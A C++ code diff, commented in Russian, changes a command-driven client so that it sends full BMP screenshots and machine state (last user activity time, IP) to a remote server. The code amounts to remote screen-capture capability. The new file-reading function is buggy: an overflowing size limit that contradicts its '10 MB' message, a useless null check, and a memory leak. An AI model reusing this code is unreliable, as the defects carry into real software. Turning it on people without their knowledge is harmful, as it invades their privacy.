@@ -212,53 +212,40 @@ std::string wstrToStr(const std::wstring& wstr) {
     return converter.to_bytes(wstr);
 }
 
-vector<string> bmpToVector(const std::string& filePath) {
-    std::ifstream file(filePath, std::ios::binary);
+char* readBmp(string filePath, ULONG64* dataSize) {
+    // Открываем файл в бинарном режиме
+    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+
     if (!file) {
-        std::cerr << "Не удалось открыть файл." << std::endl;
-        return {};
+        throw std::runtime_error("Не удалось открыть файл.");
     }
 
-    BITMAPFILEHEADER fileHeader;
-    file.read(reinterpret_cast<char*>(&fileHeader), sizeof(fileHeader));
-    if (fileHeader.bfType != 0x4D42) {
-        std::cerr << "Неверный формат BMP-файла." << std::endl;
-        return {};
+    // Получаем размер файла
+    std::streamsize fileSize = file.tellg();
+    if (fileSize > 10 * 1024 * 1024 * 1024) {
+        throw std::runtime_error("Файл слишком большой (больше 10 МБ).");
+    }
+    file.seekg(0, std::ios::beg);
+
+    // Выделяем память для данных файла
+    char* buffer = new char[fileSize];
+    if (!buffer) {
+        throw std::runtime_error("Не удалось выделить память.");
     }
 
-    BITMAPINFOHEADER infoHeader;
-    file.read(reinterpret_cast<char*>(&infoHeader), sizeof(infoHeader));
-
-    if (infoHeader.biBitCount != 24) {
-        std::cerr << "Поддерживаются только 24-битные BMP-файлы." << std::endl;
-        return {};
+    // Читаем данные файла в буфер
+    if (!file.read(buffer, fileSize)) {
+        delete[] buffer; // Освобождаем память при ошибке
+        throw std::runtime_error("Ошибка чтения файла.");
     }
 
-    int width = infoHeader.biWidth;
-    int height = infoHeader.biHeight;
-    int rowStride = (width * 3 + 3) & ~3;
-    int dataSize = rowStride * height;
-
-    file.seekg(fileHeader.bfOffBits, std::ios::beg);
-
-    std::vector<std::string> result(height);
-    std::vector<uint8_t> rowBuffer(rowStride);
-
-    for (int y = height - 1; y >= 0; --y) {
-        file.read(reinterpret_cast<char*>(rowBuffer.data()), rowStride);
-
-        std::string row;
-        for (int x = 0; x < width; ++x) {
-            uint8_t blue = rowBuffer[x * 3];
-            uint8_t green = rowBuffer[x * 3 + 1];
-            uint8_t red = rowBuffer[x * 3 + 2];
-            row += std::to_string(red) + "," + std::to_string(green) + "," + std::to_string(blue) + " ";
-        }
-        result[y] = row;
-    }
-
+    // Закрываем файл
     file.close();
-    return result;
+
+    // Устанавливаем размер данных
+    *dataSize = static_cast<std::size_t>(fileSize);
+
+    return buffer;
 }
 
 int main() {
@@ -291,12 +278,10 @@ int main() {
 
                 if (command == "GET_SCREENSHOT") {
                     string screen_path = wstrToStr(screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end())));
-                    auto data = bmpToVector(screen_path);
-                    client->sendMessage("SCREENSHOT_START");
-                    for (auto line : data) {
-                        client->sendMessage(line);
-                    }
-                    client->sendMessage("SCREENSHOT_END");
+
+                    ULONG64 size;
+                    auto data = readBmp(screen_path, &size);
+                    client->sendMessage(data, size);
 
                 }
                 else if (command == "GET_STATE") {
@@ -306,9 +291,7 @@ int main() {
                     info += "last_activ_time: " + getLastUserActivityTime() + "\n";
                     info += "ip: " + host_ip + "\n";
 
-                    client->sendMessage("STATE START");
                     client->sendMessage(info);
-                    client->sendMessage("STATE END");
                 }
             }
             catch (const std::exception& e) {
